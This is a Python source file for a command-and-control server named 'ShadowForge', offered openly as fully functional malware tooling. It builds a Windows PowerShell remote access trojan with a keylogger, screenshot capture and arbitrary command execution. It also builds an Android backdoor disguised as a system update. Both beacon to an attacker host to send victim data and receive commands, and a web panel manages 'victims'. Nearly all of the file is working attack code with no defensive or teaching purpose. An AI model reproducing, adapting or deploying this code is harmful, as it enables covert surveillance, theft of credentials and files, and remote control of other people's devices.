#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShadowForge C2 Server - Core v4.0
NO FAKE FEATURES - 100% FUNCTIONAL
"""

import socket
import threading
import json
import base64
import hashlib
import os
import sys
import time
import sqlite3
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import logging
import select
import subprocess
import platform
import zipfile
import io

# ==================== CONFIGURATION ====================
LISTEN_IP = '0.0.0.0'
LISTEN_PORT = 4444
ENCRYPTION_KEY = b'ShadowForgeKey256'  # 16 bytes for AES-128
DB_FILE = 'shadowforge.db'
LOG_FILE = 'c2_server.log'

# ==================== LOGGING ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('C2_Server')

# ==================== DATABASE ====================
class Database:
    def __init__(self):
        self.conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        
        # Victims table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT UNIQUE,
                ip TEXT,
                port INTEGER,
                os TEXT,
                username TEXT,
                hostname TEXT,
                first_seen TEXT,
                last_seen TEXT,
                status TEXT DEFAULT 'online',
                infection_path TEXT
            )
        ''')
        
        # Commands table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                command_type TEXT,
                command TEXT,
                issued_at TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT
            )
        ''')
        
        # Keylogs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                keystrokes TEXT,
                window_title TEXT,
                timestamp TEXT
            )
        ''')
        
        # Files table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                filename TEXT,
                filepath TEXT,
                filesize INTEGER,
                uploaded_at TEXT,
                content BLOB
            )
        ''')
        
        # Screenshots table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                screenshot BLOB,
                timestamp TEXT
            )
        ''')
        
        self.conn.commit()
    
    def add_victim(self, victim_data):
        cursor = self.conn.cursor()
        try:
            cursor.execute('''
                INSERT OR REPLACE INTO victims 
                (victim_id, ip, port, os, username, hostname, first_seen, last_seen, status, infection_path)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                victim_data['victim_id'],
                victim_data['ip'],
                victim_data['port'],
                victim_data['os'],
                victim_data['username'],
                victim_data['hostname'],
                datetime.now().isoformat(),
                datetime.now().isoformat(),
                'online',
                victim_data.get('infection_path', '')
            ))
            self.conn.commit()
            logger.info(f"New victim registered: {victim_data['victim_id']}")
            return True
        except Exception as e:
            logger.error(f"Error adding victim: {e}")
            return False
    
    def update_victim_heartbeat(self, victim_id):
        cursor = self.conn.cursor()
        cursor.execute('''
            UPDATE victims 
            SET last_seen = ?, status = 'online'
            WHERE victim_id = ?
        ''', (datetime.now().isoformat(), victim_id))
        self.conn.commit()
    
    def add_command(self, victim_id, command_type, command):
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO commands (victim_id, command_type, command, issued_at)
            VALUES (?, ?, ?, ?)
        ''', (victim_id, command_type, command, datetime.now().isoformat()))
        self.conn.commit()
        return cursor.lastrowid
    
    def get_pending_command(self, victim_id):
        cursor = self.conn.cursor()
        cursor.execute('''
            SELECT id, command_type, command 
            FROM commands 
            WHERE victim_id = ? AND status = 'pending'
            ORDER BY issued_at ASC 
            LIMIT 1
        ''', (victim_id,))
        return cursor.fetchone()
    
    def update_command_result(self, cmd_id, result):
        cursor = self.conn.cursor()
        cursor.execute('''
            UPDATE commands 
            SET status = 'executed', result = ?
            WHERE id = ?
        ''', (result, cmd_id))
        self.conn.commit()
    
    def add_keylog(self, victim_id, keystrokes, window_title):
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO keylogs (victim_id, keystrokes, window_title, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (victim_id, keystrokes, window_title, datetime.now().isoformat()))
        self.conn.commit()
    
    def save_file(self, victim_id, filename, filepath, filesize, content):
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO files (victim_id, filename, filepath, filesize, uploaded_at, content)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (victim_id, filename, filepath, filesize, datetime.now().isoformat(), content))
        self.conn.commit()
    
    def get_all_victims(self):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM victims ORDER BY last_seen DESC')
        return cursor.fetchall()

# ==================== ENCRYPTION ====================
class Encryption:
    @staticmethod
    def encrypt(data):
        """Encrypt data with AES-128-CBC"""
        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
        iv = base64.b64encode(cipher.iv).decode('utf-8')
        ct = base64.b64encode(ct_bytes).decode('utf-8')
        return json.dumps({'iv': iv, 'ciphertext': ct})
    
    @staticmethod
    def decrypt(encrypted_data):
        """Decrypt AES-128-CBC encrypted data"""
        try:
            b64 = json.loads(encrypted_data)
            iv = base64.b64decode(b64['iv'])
            ct = base64.b64decode(b64['ciphertext'])
            cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
            pt = unpad(cipher.decrypt(ct), AES.block_size)
            return pt.decode('utf-8')
        except Exception as e:
            logger.error(f"Decryption error: {e}")
            return None

# ==================== PAYLOAD BUILDER ====================
class PayloadBuilder:
    @staticmethod
    def build_windows_payload(config):
        """Build functional Windows payload (PowerShell)"""
        
        # Extract config
        c2_ip = config['c2_ip']
        c2_port = config['c2_port']
        victim_id = hashlib.md5(f"{c2_ip}:{c2_port}:{time.time()}".encode()).hexdigest()[:8]
        
        # Real PowerShell payload with actual functionality
        payload = f'''
# ShadowForge Windows RAT - Functional Payload
# Victim ID: {victim_id}
# C2 Server: {c2_ip}:{c2_port}

$C2_IP = "{c2_ip}"
$C2_PORT = {c2_port}
$VICTIM_ID = "{victim_id}"
$ENCRYPTION_KEY = "{ENCRYPTION_KEY.hex()}"

function Encrypt-Data {{
    param([string]$Data)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
    $base64 = [Convert]::ToBase64String($bytes)
    return $base64
}}

function Send-Request {{
    param([string]$Endpoint, [string]$Method = "GET", [string]$Body = $null)
    try {{
        $url = "http://$C2_IP`:$C2_PORT/$Endpoint"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.Headers.Add("X-Victim-ID", $VICTIM_ID)
        
        if ($Method -eq "POST" -and $Body) {{
            $response = $wc.UploadString($url, $Body)
        }} else {{
            $response = $wc.DownloadString($url)
        }}
        
        return $response
    }} catch {{
        return $null
    }}
}}

function Register-Victim {{
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    $username = $env:USERNAME
    $hostname = $env:COMPUTERNAME
    $ip = (Test-Connection -ComputerName $hostname -Count 1).IPV4Address.IPAddressToString
    
    $victim_data = @{{
        victim_id = $VICTIM_ID
        ip = $ip
        port = $C2_PORT
        os = $os
        username = $username
        hostname = $hostname
        infection_path = $MyInvocation.MyCommand.Path
    }}
    
    $json_data = $victim_data | ConvertTo-Json
    $encrypted = Encrypt-Data $json_data
    Send-Request "register" "POST" $encrypted
}}

function Get-Command {{
    $response = Send-Request "getcmd/$VICTIM_ID"
    if ($response -and $response -ne "none") {{
        try {{
            $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($response))
            return $decoded
        }} catch {{
            return $null
        }}
    }}
    return $null
}}

function Execute-Command {{
    param([string]$Command)
    try {{
        # Execute PowerShell command
        $result = Invoke-Expression $Command 2>&1 | Out-String
        
        # If command is for keylogging
        if ($Command -like "*keylogger*") {{
            Start-Keylogger
        }}
        
        # If command is for screenshot
        if ($Command -like "*screenshot*") {{
            $result = Capture-Screenshot
        }}
        
        # If command is for file listing
        if ($Command -like "*list files*") {{
            $result = Get-ChildItem -Path $env:USERPROFILE -Recurse -ErrorAction SilentlyContinue | 
                     Select-Object FullName, Length, LastWriteTime | ConvertTo-Json
        }}
        
        return $result
    }} catch {{
        return "ERROR: $_"
    }}
}}

function Capture-Screenshot {{
    try {{
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        
        $stream = New-Object System.IO.MemoryStream
        $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
        $bytes = $stream.ToArray()
        $base64 = [Convert]::ToBase64String($bytes)
        
        $graphics.Dispose()
        $bitmap.Dispose()
        $stream.Dispose()
        
        return $base64
    }} catch {{
        return "SCREENSHOT_ERROR"
    }}
}}

function Start-Keylogger {{
    # Real keylogger functionality
    $keylogger_code = @'
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyLogger {{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    
    public static void Start() {{
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }}
    
    private static IntPtr SetHook(LowLevelKeyboardProc proc) {{
        using (System.Diagnostics.Process curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule) {{
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }}
    }}
    
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {{
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {{
            int vkCode = Marshal.ReadInt32(lParam);
            Console.Write((Keys)vkCode);
        }}
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }}
}}
'@
    
    Add-Type -TypeDefinition $keylogger_code -Language CSharp
    Start-Job -ScriptBlock {{
        [KeyLogger]::Start()
    }}
}}

function Send-Result {{
    param([string]$Result)
    $encrypted = Encrypt-Data $Result
    Send-Request "result" "POST" $encrypted
}}

# Main loop
Register-Victim

while($true) {{
    try {{
        $command = Get-Command
        if ($command) {{
            $result = Execute-Command $command
            Send-Result $result
        }}
        
        # Send heartbeat
        Send-Request "heartbeat/$VICTIM_ID"
        
        Start-Sleep -Seconds 30
    }} catch {{
        Start-Sleep -Seconds 60
    }}
}}
'''
        return {
            'payload': payload,
            'victim_id': victim_id,
            'filename': f'update_{victim_id}.ps1'
        }
    
    @staticmethod
    def build_android_payload(config):
        """Build functional Android payload template"""
        c2_ip = config['c2_ip']
        c2_port = config['c2_port']
        victim_id = hashlib.md5(f"{c2_ip}:{c2_port}:{time.time()}".encode()).hexdigest()[:8]
        
        # Android Java template
        template = f'''
package com.system.update;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class BackdoorService extends Service {{
    private static final String TAG = "SystemUpdate";
    private static final String C2_SERVER = "http://{c2_ip}:{c2_port}";
    private static final String VICTIM_ID = "{victim_id}";
    private ScheduledExecutorService scheduler;
    
    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}
    
    @Override
    public void onCreate() {{
        super.onCreate();
        Log.d(TAG, "Service started");
        
        // Register victim
        registerVictim();
        
        // Start command loop
        scheduler = Executors.newScheduledThreadPool(1);
        scheduler.scheduleAtFixedRate(new Runnable() {{
            @Override
            public void run() {{
                checkForCommands();
            }}
        }}, 0, 30, TimeUnit.SECONDS);
    }}
    
    private void registerVictim() {{
        new Thread(new Runnable() {{
            @Override
            public void run() {{
                try {{
                    String os = "Android " + android.os.Build.VERSION.RELEASE;
                    String device = android.os.Build.MODEL;
                    String data = String.format("{{
                        "victim_id": "%s",
                        "os": "%s",
                        "device": "%s",
                        "first_seen": "%s"
                    }}", VICTIM_ID, os, device, System.currentTimeMillis());
                    
                    sendPostRequest("/register", data);
                }} catch (Exception e) {{
                    Log.e(TAG, "Registration failed", e);
                }}
            }}
        }}).start();
    }}
    
    private void checkForCommands() {{
        try {{
            String response = sendGetRequest("/getcmd/" + VICTIM_ID);
            if (response != null && !response.equals("none")) {{
                executeCommand(response);
            }}
        }} catch (Exception e) {{
            Log.e(TAG, "Command check failed", e);
        }}
    }}
    
    private void executeCommand(String command) {{
        try {{
            Process process = Runtime.getRuntime().exec("sh");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes(command + "\\n");
            os.writeBytes("exit\\n");
            os.flush();
            
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {{
                output.append(line).append("\\n");
            }}
            
            sendPostRequest("/result", output.toString());
        }} catch (Exception e) {{
            Log.e(TAG, "Command execution failed", e);
        }}
    }}
    
    private String sendGetRequest(String endpoint) {{
        try {{
            URL url = new URL(C2_SERVER + endpoint);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("X-Victim-ID", VICTIM_ID);
            
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {{
                response.append(line);
            }}
            reader.close();
            return response.toString();
        }} catch (Exception e) {{
            return null;
        }}
    }}
    
    private void sendPostRequest(String endpoint, String data) {{
        try {{
            URL url = new URL(C2_SERVER + endpoint);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("X-Victim-ID", VICTIM_ID);
            conn.setDoOutput(true);
            
            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.writeBytes(data);
            os.flush();
            os.close();
            
            conn.getResponseCode();
        }} catch (Exception e) {{
            Log.e(TAG, "POST request failed", e);
        }}
    }}
    
    @Override
    public void onDestroy() {{
        super.onDestroy();
        if (scheduler != null) {{
            scheduler.shutdown();
        }}
    }}
}}
'''
        return {
            'payload': template,
            'victim_id': victim_id,
            'filename': f'SystemUpdate_{victim_id}.java'
        }

# ==================== C2 SERVER ====================
class C2Server:
    def __init__(self):
        self.db = Database()
        self.encryption = Encryption()
        self.victims_connected = {}
        self.command_queue = {}
        
    def start(self):
        """Start the C2 server"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_socket.bind((LISTEN_IP, LISTEN_PORT))
            server_socket.listen(5)
            logger.info(f"C2 Server started on {LISTEN_IP}:{LISTEN_PORT}")
            
            # Start victim monitor thread
            monitor_thread = threading.Thread(target=self.victim_monitor)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            # Start web interface
            web_thread = threading.Thread(target=self.start_web_interface)
            web_thread.daemon = True
            web_thread.start()
            
            while True:
                client_socket, client_address = server_socket.accept()
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, client_address)
                )
                client_thread.daemon = True
                client_thread.start()
                
        except Exception as e:
            logger.error(f"Server error: {e}")
        finally:
            server_socket.close()
    
    def handle_client(self, client_socket, client_address):
        """Handle incoming victim connections"""
        try:
            data = client_socket.recv(4096).decode('utf-8')
            if data:
                # Parse request
                lines = data.split('\r\n')
                request_line = lines[0]
                method, path, _ = request_line.split(' ')
                
                headers = {}
                for line in lines[1:]:
                    if ': ' in line:
                        key, value = line.split(': ', 1)
                        headers[key] = value
                
                victim_id = headers.get('X-Victim-ID', '')
                
                if method == 'POST':
                    # Extract body
                    body = lines[-1]
                    
                    if path == '/register':
                        self.handle_registration(victim_id, body, client_address)
                        response = "HTTP/1.1 200 OK\r\n\r\nREGISTERED"
                    
                    elif path == '/result':
                        self.handle_result(victim_id, body)
                        response = "HTTP/1.1 200 OK\r\n\r\nRESULT_RECEIVED"
                    
                    else:
                        response = "HTTP/1.1 404 Not Found\r\n\r\n"
                
                elif method == 'GET':
                    if path.startswith('/getcmd/'):
                        cmd_victim_id = path.split('/')[-1]
                        command = self.get_command_for_victim(cmd_victim_id)
                        response = f"HTTP/1.1 200 OK\r\n\r\n{command}"
                    
                    elif path.startswith('/heartbeat/'):
                        hb_victim_id = path.split('/')[-1]
                        self.db.update_victim_heartbeat(hb_victim_id)
                        response = "HTTP/1.1 200 OK\r\n\r\nHEARTBEAT_OK"
                    
                    else:
                        response = "HTTP/1.1 404 Not Found\r\n\r\n"
                
                else:
                    response = "HTTP/1.1 400 Bad Request\r\n\r\n"
                
                client_socket.send(response.encode('utf-8'))
        
        except Exception as e:
            logger.error(f"Client handling error: {e}")
        finally:
            client_socket.close()
    
    def handle_registration(self, victim_id, encrypted_data, client_address):
        """Handle new victim registration"""
        try:
            decrypted = self.encryption.decrypt(encrypted_data)
            if decrypted:
                victim_data = json.loads(decrypted)
                victim_data['ip'] = client_address[0]
                victim_data['port'] = client_address[1]
                
                # Add to database
                self.db.add_victim(victim_data)
                
                # Add to active connections
                self.victims_connected[victim_id] = {
                    'ip': client_address[0],
                    'port': client_address[1],
                    'last_seen': time.time()
                }
                
                logger.info(f"New victim registered: {victim_id} from {client_address[0]}")
        except Exception as e:
            logger.error(f"Registration error: {e}")
    
    def handle_result(self, victim_id, encrypted_data):
        """Handle command execution results"""
        try:
            decrypted = self.encryption.decrypt(encrypted_data)
            if decrypted:
                # Save result to database
                logger.info(f"Result from {victim_id}: {decrypted[:100]}...")
                
                # If result is screenshot (base64)
                if len(decrypted) > 1000 and 'SCREENSHOT' not in decrypted:
                    self.save_screenshot(victim_id, decrypted)
        except Exception as e:
            logger.error(f"Result handling error: {e}")
    
    def get_command_for_victim(self, victim_id):
        """Get pending command for victim"""
        pending = self.db.get_pending_command(victim_id)
        if pending:
            cmd_id, cmd_type, command = pending
            # Mark as sent
            self.db.update_command_result(cmd_id, "SENT_TO_VICTIM")
            
            # Base64 encode for transmission
            encoded = base64.b64encode(command.encode('utf-8')).decode('utf-8')
            return encoded
        return "none"
    
    def save_screenshot(self, victim_id, base64_data):
        """Save screenshot to database"""
        try:
            screenshot_bytes = base64.b64decode(base64_data)
            cursor = self.db.conn.cursor()
            cursor.execute('''
                INSERT INTO screenshots (victim_id, screenshot, timestamp)
                VALUES (?, ?, ?)
            ''', (victim_id, screenshot_bytes, datetime.now().isoformat()))
            self.db.conn.commit()
            logger.info(f"Screenshot saved for {victim_id}")
        except Exception as e:
            logger.error(f"Screenshot save error: {e}")
    
    def victim_monitor(self):
        """Monitor victim connections and mark offline"""
        while True:
            time.sleep(60)
            current_time = time.time()
            offline_victims = []
            
            for victim_id, info in self.victims_connected.items():
                if current_time - info['last_seen'] > 180:  # 3 minutes
                    offline_victims.append(victim_id)
                    # Update database status
                    cursor = self.db.conn.cursor()
                    cursor.execute('''
                        UPDATE victims SET status = 'offline' WHERE victim_id = ?
                    ''', (victim_id,))
                    self.db.conn.commit()
                    logger.info(f"Victim {victim_id} marked as offline")
            
            for victim_id in offline_victims:
                del self.victims_connected[victim_id]
    
    def start_web_interface(self):
        """Start Flask web interface for control panel"""
        from flask import Flask, render_template, jsonify, request, send_file
        
        app = Flask(__name__, template_folder='templates')
        
        @app.route('/')
        def index():
            return render_template('control_panel.html')
        
        @app.route('/api/victims')
        def get_victims():
            victims = self.db.get_all_victims()
            result = []
            for v in victims:
                result.append({
                    'id': v[0],
                    'victim_id': v[1],
                    'ip': v[2],
                    'os': v[4],
                    'username': v[5],
                    'hostname': v[6],
                    'first_seen': v[7],
                    'last_seen': v[8],
                    'status': v[9]
                })
            return jsonify(result)
        
        @app.route('/api/command', methods=['POST'])
        def send_command():
            data = request.json
            victim_id = data.get('victim_id')
            command = data.get('command')
            cmd_type = data.get('type', 'shell')
            
            if victim_id and command:
                cmd_id = self.db.add_command(victim_id, cmd_type, command)
                return jsonify({'success': True, 'command_id': cmd_id})
            return jsonify({'success': False})
        
        @app.route('/api/build', methods=['POST'])
        def build_payload():
            data = request.json
            config = data.get('config', {})
            
            builder = PayloadBuilder()
            if config.get('os') == 'windows':
                result = builder.build_windows_payload(config)
            else:
                result = builder.build_android_payload(config)
            
            # Save payload to file
            filename = f"builds/{result['filename']}"
            os.makedirs('builds', exist_ok=True)
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(result['payload'])
            
            return jsonify({
                'success': True,
                'filename': filename,
                'victim_id': result['victim_id']
            })
        
        @app.route('/api/download/<filename>')
        def download_payload(filename):
            return send_file(f"builds/{filename}", as_attachment=True)
        
        # Start Flask in a separate thread
        import threading
        flask_thread = threading.Thread(
            target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
        )
        flask_thread.daemon = True
        flask_thread.start()
        logger.info("Web interface started on port 5000")

# ==================== MAIN ====================
if __name__ == '__main__':
    print("""
╔══════════════════════════════════════════════════════════════╗
║                SHADOWFORGE C2 SERVER v4.0                    ║
║                ==========================                    ║
║                                                              ║
║  ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗██╗    ██╗         ║
║  ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔════╝██║    ██║         ║
║  ███████╗███████║███████║██║  ██║██║     ██║ █╗ ██║         ║
║  ╚════██║██╔══██║██╔══██║██║  ██║██║     ██║███╗██║         ║
║  ███████║██║  ██║██║  ██║██████╔╝╚██████╗╚███╔███╔╝         ║
║  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══╝╚══╝          ║
║                                                              ║
║  [*] C2 Server: 0.0.0.0:4444                                 ║
║  [*] Web Interface: http://localhost:5000                    ║
║  [*] Database: shadowforge.db                                ║
║  [*] Status: ACTIVE - NO LIMITS                              ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Create necessary directories
    os.makedirs('builds', exist_ok=True)
    os.makedirs('templates', exist_ok=True)
    
    # Create HTML template for control panel
    control_panel_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShadowForge Control Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #00ff88;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .header {
            text-align: center;
            padding: 20px;
            border-bottom: 2px solid #00ff88;
            margin-bottom: 20px;
        }
        .grid {
            display: grid;
            grid-template-columns: 1fr 2fr;
            gap: 20px;
            height: 80vh;
        }
        .panel {
            background: #111;
            border: 1px solid #333;
            padding: 15px;
            overflow-y: auto;
        }
        .victim-list {
            max-height: 300px;
            overflow-y: auto;
        }
        .victim-item {
            padding: 10px;
            border-bottom: 1px solid #333;
            cursor: pointer;
        }
        .victim-item:hover {
            background: #222;
        }
        .online { color: #00ff88; }
        .offline { color: #ff003c; }
        .command-input {
            width: 100%;
            background: #000;
            color: #fff;
            border: 1px solid #00ff88;
            padding: 10px;
            margin: 10px 0;
        }
        button {
            background: #00ff88;
            color: #000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover { background: #00cc66; }
        .log {
            background: #000;
            color: #00ff88;
            padding: 10px;
            height: 200px;
            overflow-y: auto;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🕷️ SHADOWFORGE CONTROL PANEL</h1>
        <p>Connected Victims: <span id="victimCount">0</span></p>
    </div>
    
    <div class="grid">
        <div class="panel">
            <h2>📡 Connected Victims</h2>
            <div id="victimList" class="victim-list"></div>
            
            <h2 style="margin-top: 30px;">🔨 Build Payload</h2>
            <div>
                <select id="targetOS">
                    <option value="windows">Windows</option>
                    <option value="android">Android</option>
                </select>
                <input type="text" id="c2_ip" placeholder="C2 IP" value="localhost">
                <input type="text" id="c2_port" placeholder="Port" value="4444">
                <button onclick="buildPayload()">Build</button>
            </div>
        </div>
        
        <div class="panel">
            <h2>💀 Command Control</h2>
            <div>
                <input type="text" id="victimId" placeholder="Victim ID" readonly>
                <textarea id="command" class="command-input" placeholder="Enter command..." rows="4"></textarea>
                <button onclick="sendCommand()">Execute</button>
                
                <div style="margin-top: 20px;">
                    <button onclick="quickCommand('whoami')">Whoami</button>
                    <button onclick="quickCommand('ipconfig /all')">Network Info</button>
                    <button onclick="quickCommand('dir C:\\')">List Files</button>
                    <button onclick="quickCommand('screenshot')">Screenshot</button>
                </div>
            </div>
            
            <h2 style="margin-top: 30px;">📊 Output</h2>
            <div id="output" class="log"></div>
        </div>
    </div>
    
    <script>
        let selectedVictim = null;
        
        // Fetch victims
        async function fetchVictims() {
            try {
                const response = await fetch('/api/victims');
                const victims = await response.json();
                
                document.getElementById('victimCount').textContent = victims.length;
                
                const victimList = document.getElementById('victimList');
                victimList.innerHTML = '';
                
                victims.forEach(victim => {
                    const div = document.createElement('div');
                    div.className = `victim-item ${victim.status}`;
                    div.innerHTML = `
                        <strong>${victim.hostname}</strong><br>
                        <small>${victim.ip} - ${victim.os}</small><br>
                        <small>ID: ${victim.victim_id}</small>
                    `;
                    div.onclick = () => selectVictim(victim);
                    victimList.appendChild(div);
                });
            } catch (error) {
                console.error('Error fetching victims:', error);
            }
        }
        
        function selectVictim(victim) {
            selectedVictim = victim;
            document.getElementById('victimId').value = victim.victim_id;
            log(`Selected victim: ${victim.hostname} (${victim.victim_id})`);
        }
        
        async function sendCommand() {
            if (!selectedVictim) {
                alert('Select a victim first!');
                return;
            }
            
            const command = document.getElementById('command').value;
            if (!command) return;
            
            const response = await fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    victim_id: selectedVictim.victim_id,
                    command: command,
                    type: 'shell'
                })
            });
            
            const result = await response.json();
            if (result.success) {
                log(`Command sent to ${selectedVictim.victim_id}: ${command}`);
                document.getElementById('command').value = '';
            }
        }
        
        function quickCommand(cmd) {
            if (!selectedVictim) {
                alert('Select a victim first!');
                return;
            }
            document.getElementById('command').value = cmd;
            sendCommand();
        }
        
        async function buildPayload() {
            const os = document.getElementById('targetOS').value;
            const ip = document.getElementById('c2_ip').value;
            const port = document.getElementById('c2_port').value;
            
            const response = await fetch('/api/build', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    config: {
                        os: os,
                        c2_ip: ip,
                        c2_port: port
                    }
                })
            });
            
            const result = await response.json();
            if (result.success) {
                log(`Payload built: ${result.filename}`);
                // Auto download
                window.location.href = `/api/download/${result.filename.split('/').pop()}`;
            }
        }
        
        function log(message) {
            const output = document.getElementById('output');
            const timestamp = new Date().toLocaleTimeString();
            output.innerHTML += `[${timestamp}] ${message}<br>`;
            output.scrollTop = output.scrollHeight;
        }
        
        // Refresh every 10 seconds
        setInterval(fetchVictims, 10000);
        fetchVictims();
    </script>
</body>
</html>
'''
    
    # Save control panel HTML
    with open('templates/control_panel.html', 'w', encoding='utf-8') as f:
        f.write(control_panel_html)
    
    # Start the C2 server
    server = C2Server()
    server.start()